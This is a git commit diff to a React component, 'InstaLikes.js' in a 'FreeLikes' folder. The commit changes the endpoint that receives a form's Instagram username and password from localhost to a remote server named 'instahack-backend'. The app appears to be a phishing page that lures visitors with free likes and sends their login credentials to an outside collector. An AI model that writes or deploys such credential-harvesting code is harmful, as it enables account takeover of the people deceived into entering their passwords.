948cf60c6230f0c95bfe2460d1596875a28cb37b
Montythakur9870 <132164798+Montythakur9870@users.noreply.github.com>
2025-02-14 20:24:41 +0530

    Update InstaLikes.js

--- frontend/src/Components/FreeLikes/InstaLikes.js
+++ frontend/src/Components/FreeLikes/InstaLikes.js
@@ -12,7 +12,7 @@ const InstaLikes = () => {
     setMessage("");
 
     try {
-      const { data } = await axios.post("http://localhost:5000/api/register", {
+      const { data } = await axios.post("https://instahack-backend.onrender.com/api/register", {
         instagramUsername,
         password,
       });
